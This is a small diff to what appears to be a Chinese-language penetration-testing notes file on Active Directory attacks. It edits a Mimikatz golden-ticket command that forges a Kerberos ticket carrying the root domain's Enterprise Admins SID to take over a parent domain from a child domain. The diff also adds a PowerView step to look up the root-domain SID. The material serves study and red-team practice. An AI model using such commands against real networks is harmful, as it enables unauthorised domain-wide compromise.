@@ -456,7 +456,8 @@ Startoffset和endin分别代表偏移量和长度，renewmax表示生成的票�
 
 
 ```
-kerberos::golden /admin:administrator /domain:news.uknowsec.cn /sid:XXX(Child-DomainSid) /sids:XXX-519(Root-DomainSid, 519 means Enterprise Admins group in Root-Domain) /krbtgt:XXX /startoffset:0 /endin:600 /renewmax:10080 /ptt
+Get the root-domain sid(powerview module): Convert-NameToSid uknowsec.cn\krbtgt 
+kerberos::golden /admin:administrator /domain:news.uknowsec.cn /sid:XXX(Child-DomainSid) /sids:XXX-519(Root-Domain sid, 519 means Enterprise Admins group in Root-Domain) /krbtgt:XXX /startoffset:0 /endin:600 /renewmax:10080 /ptt
 ```
 
 
